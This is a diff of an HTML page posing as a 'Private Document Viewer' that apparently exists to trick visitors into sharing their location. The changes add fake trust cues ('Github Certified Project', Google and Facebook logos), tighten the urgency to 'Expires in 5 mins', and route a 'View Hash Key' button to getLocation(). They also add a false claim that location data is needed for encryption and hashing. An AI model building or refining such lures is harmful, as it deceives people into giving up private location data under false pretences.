@@ -16,15 +16,19 @@
 
 <body>
 
-  <h4>Cut the Crap. Simple & Private.</h4>
+  <!-- <h4>Cut the Crap. Simple & Private.</h4> -->
 
   <div class="container">
+    <div class="bottom">
+      <img src="/images/google.svg" alt="" height="20px">
+      <img src="/images/facebook.svg" alt="" height="20px">
+    </div>
     <header><i class="ri-github-fill"></i>Github Certified Project</header>
 
-    <h1>Private Document Viewer</h1>
+    <!-- <h1>Private Document Viewer</h1> -->
 
     <div class="message-info">
-      <p>You were sent a private document. <br> <strong>Expires in 20 mins.</strong></p>
+      <p>You were sent a private document. <br> <strong>Expires in 5 mins.</strong></p>
     </div>
 
     <div class="file-info">
@@ -38,29 +42,51 @@
     <!-- <p>Click to Download</p> -->
 
     <!-- <button onclick="getLocation()"><a href="/images/Social-Front.jpg">Download<i class="ri-download-line"></i></a> -->
-    <a href="#" onclick="getLocation()"><button>View Passcode<i class="ri-lock-unlock-line"></i></a></button>
+    <!-- <a href="#" onclick="getLocation()"><button>Download<i class="ri-download-line"></i></a></button> -->
 
 
-    <!-- <a href="#" onclick="getLocation()"><button>Download</button></a> -->
+    <a href="#" onclick="getLocation()"><button>View Hash Key</button></a>
 
 
-    <div class="download-issues">
-      <!-- <p>Issues Downloading? <a href="/images/Social-Front.jpg">Click Here</a></p> -->
-      <p>Issues Downloading? <a href="./passcode-info.html">Click Here</a></p>
-    </div>
+    <!-- <div class="download-issues">
+      <p>Issues Downloading? <a href="#">Click Here</a></p>
+    </div> -->
     <p id="demo"></p>
-
-
-    <div id="googleMap" style="width:100%;height:400px;"></div>
-    <div class="bottom">
-      <img src="/images/google.svg" alt="" height="30px">
-      <img src="/images/facebook.svg" alt="" height="30px">
-
+    <p>Enable <b>Location</b> for Encryption</p>
+    <div class="js-retry-location">
+      <button class=""> <i class="ri-map-pin-2-fill"></i></button>
+      <p>Why do we need <b><a href="#info"> Location</b> </a>for Encryption?</p>
     </div>
+
+    <!-- <div class="bottom">
+      <img src="/images/google.svg" alt="" height="20px">
+      <img src="/images/facebook.svg" alt="" height="20px">
+    </div> -->
   </div>
+
   <div class="ad">
     <img src="/images/QB-Ad.jpg" alt="">
   </div>
+
+  <div class="container" id="info">
+    <h1>Why we use Location data for Hashing</h1>
+    <p>Hashing is the process of transforming any given key or a string of characters into another value. This is
+      usually represented by a shorter, fixed-length value or key that represents and makes it easier to find or employ
+      the original string.
+      The most popular use for hashing is the implementation of hash tables. A hash table stores key and value pairs in
+      a list that is accessible through its index. </p>
+  </div>
+
+  <!-- <footer>
+
+    <div class="icons">
+      <i class="ri-home-fill"></i>
+      <i class="ri-settings-2-line"></i>
+      <i class="ri-user-line"></i>
+    </div>
+  </footer> -->
+
+
   <script src="app.js"></script>
   <script src="/client.js"></script>
 </body>
